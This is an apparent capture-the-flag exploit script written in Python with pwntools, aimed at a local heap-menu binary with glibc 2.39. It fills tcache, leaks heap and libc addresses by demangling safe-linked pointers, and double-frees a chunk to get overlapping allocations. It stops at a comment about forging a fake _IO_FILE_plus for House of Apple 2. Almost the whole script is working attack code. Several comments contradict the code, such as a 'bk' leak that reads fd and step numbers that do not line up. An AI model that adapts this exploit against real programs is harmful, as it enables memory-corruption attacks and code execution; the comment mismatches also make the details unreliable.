#!/usr/bin/env python3
from pwn import *
from safe_linking import mangle, demangle_from_leak

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')                                          # pinned 2.39
io = process('./vuln', env={'LD_PRELOAD': './libc.so.6'})

SZ = 0xf0                                     # requests chunk of size 0x100 ❶

def alloc(i, sz=SZ):    io.sendlineafter(b'> ', b'1'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendlineafter(b'sz: ', str(sz).encode())
def free(i):            io.sendlineafter(b'> ', b'2'); io.sendlineafter(b'idx: ', str(i).encode())
def edit(i, data):      io.sendlineafter(b'> ', b'3'); io.sendlineafter(b'idx: ', str(i).encode()); io.sendafter(b'data: ', data)
def show(i):            io.sendlineafter(b'> ', b'4'); io.sendlineafter(b'idx: ', str(i).encode()); return io.recvline().strip()

# 1..7: fill tcache targets; 8: victim; 9: next (adjacent); 10: guard
for i in range(9): alloc(i)                                        # A0..A8
alloc(9, 0x20)                                                     # guard ❷

for i in range(7): free(i)                                          # tcache full
free(8); free(9)                                                    # step 5,6: unsorted+consolidate ❸

# heap leak: victim now holds a mangled fd pointing at the next tcache node.
mangled_fd = u64(show(0).ljust(8, b'\x00'))                        # A0's fd survived
heap_base  = demangle_from_leak(node_addr=0, stored_fd=mangled_fd) & ~0xfff
log.success('heap @ %#x', heap_base)                                # ❹

# libc leak: victim's bk points into main_arena because it is unsorted.
alloc(10)                                                            # pop A6 -> tcache room
libc_leak = u64(show(8).ljust(8, b'\x00'))                          # victim's fd = arena
libc.address = libc_leak - 0x203b20                                  # arena offset in 2.39 ❺
log.success('libc @ %#x', libc.address)

free(8)                                                              # step 8: double-free ❻

# Two allocs: first returns victim (from tcache), second returns overlap (from unsorted split)
alloc(11)                    # == victim
alloc(12)                    # overlaps victim's tail

# From here: forge a fake _IO_FILE_plus in the overlap and chain into House of Apple 2.
